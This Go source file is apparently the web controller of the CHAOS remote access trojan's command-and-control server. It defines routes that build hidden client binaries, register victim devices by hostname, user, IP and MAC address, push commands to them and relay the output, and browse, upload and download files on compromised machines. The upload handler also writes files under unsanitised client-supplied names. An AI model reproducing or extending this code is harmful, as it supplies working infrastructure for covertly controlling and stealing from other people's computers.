package http

import (
	"context"
	"encoding/json"
	"fmt"
	"github.com/gin-gonic/gin"
	"github.com/gin-gonic/gin/binding"
	"github.com/sirupsen/logrus"
	"github.com/tiagorlampert/CHAOS/entities"
	"github.com/tiagorlampert/CHAOS/middleware"
	"github.com/tiagorlampert/CHAOS/services"
	"github.com/tiagorlampert/CHAOS/shared/environment"
	"github.com/tiagorlampert/CHAOS/shared/utils"
	"github.com/tiagorlampert/CHAOS/shared/utils/constant"
	"github.com/tiagorlampert/CHAOS/shared/utils/network"
	"github.com/tiagorlampert/CHAOS/shared/utils/system"
	"net/http"
	"path/filepath"
	"strconv"
	"strings"
	"time"
)

type httpController struct {
	configuration  *environment.Configuration
	logger         *logrus.Logger
	authMiddleware *middleware.JWT
	clientService  services.Client
	systemService  services.System
	userService    services.User
	deviceService  services.Device
	payloadService services.Payload
}

func NewController(
	configuration *environment.Configuration,
	router *gin.Engine,
	log *logrus.Logger,
	authMiddleware *middleware.JWT,
	clientService services.Client,
	systemService services.System,
	payloadService services.Payload,
	userService services.User,
	deviceService services.Device) {
	handler := &httpController{
		configuration:  configuration,
		authMiddleware: authMiddleware,
		logger:         log,
		clientService:  clientService,
		payloadService: payloadService,
		systemService:  systemService,
		userService:    userService,
		deviceService:  deviceService,
	}

	router.NoRoute(handler.noRouteHandler)
	router.GET("/health", handler.healthHandler)
	router.GET("/login", handler.loginHandler)
	router.POST("/auth", authMiddleware.LoginHandler)

	authAdmin := router.Group("")
	authAdmin.Use(authMiddleware.MiddlewareFunc())
	authAdmin.Use(authMiddleware.AuthAdmin) //require admin role token

	auth := router.Group("")
	auth.Use(authMiddleware.MiddlewareFunc())
	{
		authAdmin.GET("/", handler.getDevicesHandler)

		router.GET("/logout", authMiddleware.LogoutHandler)

		authAdmin.GET("/settings", handler.getSettingsHandler)
		authAdmin.GET("/settings/refresh-token", handler.refreshTokenHandler)

		authAdmin.GET("/profile", handler.getUserProfileHandler)
		authAdmin.POST("/user", handler.createUserHandler)
		authAdmin.PUT("/user/password", handler.updateUserPasswordHandler)

		auth.POST("/device", handler.setDeviceHandler)
		authAdmin.GET("/devices", handler.getDevicesHandler)

		authAdmin.POST("/command", handler.sendCommandHandler)
		auth.GET("/command", handler.getCommandHandler)
		auth.PUT("/command", handler.respondCommandHandler)

		authAdmin.GET("/shell", handler.shellHandler)

		authAdmin.GET("/generate", handler.generateBinaryGetHandler)
		authAdmin.POST("/generate", handler.generateBinaryPostHandler)

		authAdmin.GET("/explorer", handler.fileExplorerHandler)

		auth.GET("/download/:filename", handler.downloadFileHandler)
		auth.POST("/upload", handler.uploadFileHandler)
	}
}

func (h *httpController) noRouteHandler(c *gin.Context) {
	c.Redirect(http.StatusMovedPermanently, "/")
	c.Abort()
	return
}

func (h *httpController) healthHandler(c *gin.Context) {
	c.Status(http.StatusOK)
	return
}

func (h *httpController) loginHandler(c *gin.Context) {
	c.HTML(http.StatusOK, "login.html", gin.H{})
	return
}

func (h *httpController) getSettingsHandler(c *gin.Context) {
	config, err := h.systemService.GetParams()
	if err != nil {
		h.logger.Error(err)
		c.Status(http.StatusInternalServerError)
		return
	}
	c.HTML(http.StatusOK, "settings.html", gin.H{
		"SecretKey": config.SecretKey,
	})
	return
}

func (h *httpController) refreshTokenHandler(c *gin.Context) {
	secret, err := h.systemService.RefreshSecretKey()
	if err != nil {
		h.logger.Error(err.Error())
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	c.String(http.StatusOK, secret)
	return
}

func (h *httpController) getUserProfileHandler(c *gin.Context) {
	user, _ := c.Get("user")
	c.HTML(http.StatusOK, "profile.html", gin.H{
		"Username": user.(*entities.User).Username,
	})
	return
}

func (h *httpController) createUserHandler(c *gin.Context) {
	var body entities.User
	if err := c.ShouldBind(&body); err != nil {
		h.logger.Warning(err)
		c.Status(http.StatusBadRequest)
		return
	}

	if err := h.userService.Create(body); err != nil {
		if err == services.ErrUserAlreadyExist {
			c.Status(http.StatusNotModified)
			return
		}
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	c.Status(http.StatusOK)
	return
}

func (h *httpController) updateUserPasswordHandler(c *gin.Context) {
	var body UpdateUserPasswordRequestForm
	if err := c.ShouldBind(&body); err != nil {
		h.logger.Warning(err)
		c.Status(http.StatusBadRequest)
		return
	}

	if err := h.userService.UpdatePassword(services.UpdateUserPasswordInput{
		Username:    body.Username,
		OldPassword: body.OldPassword,
		NewPassword: body.NewPassword,
	}); err != nil {
		if err == services.ErrInvalidPassword {
			c.JSON(http.StatusUnauthorized, gin.H{"error": err.Error()})
			return
		}

		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	c.Status(http.StatusOK)
	return
}

func (h *httpController) setDeviceHandler(c *gin.Context) {
	var body entities.Device
	if err := c.ShouldBindJSON(&body); err != nil {
		h.logger.Warning(err)
		c.Status(http.StatusBadRequest)
		return
	}

	fields := logrus.Fields{
		`hostname`:   body.Hostname,
		`username`:   body.UserID,
		`ipAddress`:  body.LocalIPAddress,
		`macAddress`: body.MacAddress,
		`os`:         body.OSName,
		`arch`:       body.OSArch,
	}

	if err := h.deviceService.Insert(body); err != nil {
		h.logger.WithFields(fields).Error(`Failed to persist device: `, err.Error())
		c.Status(http.StatusInternalServerError)
		return
	}

	h.logger.WithFields(fields).Info(`Device available`)
	c.Status(http.StatusOK)
	return
}

func (h *httpController) getDevicesHandler(c *gin.Context) {
	clients, err := h.deviceService.GetAllAvailable()
	if err != nil {
		h.logger.Error(`Failed to get available devices`)
		c.Status(http.StatusInternalServerError)
		return
	}

	c.HTML(http.StatusOK, "devices.html", gin.H{
		"Devices": clients,
	})
	return
}

func (h *httpController) sendCommandHandler(c *gin.Context) {
	var form SendCommandRequestForm
	if err := c.ShouldBind(&form); err != nil {
		c.String(http.StatusBadRequest, err.Error())
		return
	}
	if len(strings.TrimSpace(form.Command)) == 0 {
		c.String(http.StatusOK, constant.NoContent)
		return
	}

	ctxWithTimeout, cancel := context.WithTimeout(c, 15*time.Second)
	defer cancel()

	payload, err := h.clientService.SendCommand(ctxWithTimeout, services.SendCommandInput{
		MacAddress: form.Address,
		Request:    form.Command,
	})
	if err != nil {
		c.String(http.StatusInternalServerError, err.Error())
		return
	}
	c.String(http.StatusOK, payload.Response)
	return
}

func (h *httpController) getCommandHandler(c *gin.Context) {
	address := c.Query("address")
	decoded, err := utils.DecodeBase64(address)
	if err != nil {
		c.String(http.StatusBadRequest, err.Error())
		return
	}

	req, found := h.payloadService.Get(decoded)
	if found {
		c.JSON(http.StatusOK, req)
		return
	}
	c.Status(http.StatusNoContent)
	return
}

func (h *httpController) respondCommandHandler(c *gin.Context) {
	var body RespondCommandRequestBody
	if err := c.BindJSON(&body); err != nil {
		c.String(http.StatusBadRequest, err.Error())
		return
	}
	h.payloadService.Set(body.MacAddress, &services.PayloadData{
		Response:    body.Response,
		HasError:    body.HasError,
		HasResponse: true,
	})
	c.Status(http.StatusOK)
}

func (h *httpController) generateBinaryGetHandler(c *gin.Context) {
	c.HTML(http.StatusOK, "generate.html", gin.H{
		"Address":  network.GetLocalIP(),
		"Port":     strings.ReplaceAll(h.configuration.Server.Port, ":", ""),
		"OSTarget": system.OSTargetMap,
	})
	return
}

func (h *httpController) generateBinaryPostHandler(c *gin.Context) {
	var req GenerateClientRequestForm
	if err := c.ShouldBindWith(&req, binding.Form); err != nil {
		c.String(http.StatusBadRequest, err.Error())
		return
	}
	osTarget, err := strconv.Atoi(req.OSTarget)
	if err != nil {
		c.String(http.StatusBadRequest, err.Error())
		return
	}

	binary, err := h.clientService.BuildClient(services.BuildClientBinaryInput{
		ServerAddress: req.Address,
		ServerPort:    req.Port,
		OSTarget:      system.OSTargetIntMap[osTarget],
		Filename:      req.Filename,
		RunHidden:     utils.ParseCheckboxBoolean(req.RunHidden),
	})
	if err != nil {
		c.String(http.StatusInternalServerError, err.Error())
		return
	}
	c.String(http.StatusOK, binary)
	return
}

func (h *httpController) shellHandler(c *gin.Context) {
	c.HTML(http.StatusOK, "command.html", gin.H{})
	return
}

func (h *httpController) downloadFileHandler(c *gin.Context) {
	fileName := c.Param("filename")
	targetPath := filepath.Join(constant.TempDirectory, fileName)
	if !strings.HasPrefix(filepath.Clean(targetPath), constant.TempDirectory) {
		c.String(403, "Forbidden")
		return
	}

	c.Header("Content-Transfer-Encoding", "binary")
	c.Header("Content-Disposition", fmt.Sprintf(`attachment; filename="%s"`, fileName))
	c.File(targetPath)
}

func (h *httpController) fileExplorerHandler(c *gin.Context) {
	var req FileExplorerRequestForm
	if err := c.ShouldBind(&req); err != nil {
		c.String(http.StatusBadRequest, err.Error())
		return
	}
	path, err := utils.DecodeBase64(req.Path)
	if err != nil {
		c.String(http.StatusBadRequest, err.Error())
		return
	}

	ctxWithTimeout, cancel := context.WithTimeout(c, 15*time.Second)
	defer cancel()
	payload, err := h.clientService.SendCommand(ctxWithTimeout, services.SendCommandInput{
		MacAddress: req.Address,
		Request:    fmt.Sprint("explore ", path),
	})
	if err != nil {
		c.HTML(http.StatusOK, "explorer.html", gin.H{"error": fmt.Sprintf("Error: %s", err.Error())})
		return
	}

	var fileExplorer entities.FileExplorer
	err = json.Unmarshal(utils.StringToByte(payload.Response), &fileExplorer)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	c.HTML(http.StatusOK, "explorer.html", gin.H{
		"FileExplorer": fileExplorer,
	})
	return
}

func (h *httpController) uploadFileHandler(c *gin.Context) {
	file, err := c.FormFile("file")
	if err != nil {
		c.String(http.StatusBadRequest, err.Error())
		return
	}
	if err := c.SaveUploadedFile(file, fmt.Sprint(constant.TempDirectory, file.Filename)); err != nil {
		c.String(http.StatusInternalServerError, err.Error())
		return
	}
	c.String(http.StatusOK, file.Filename)
}
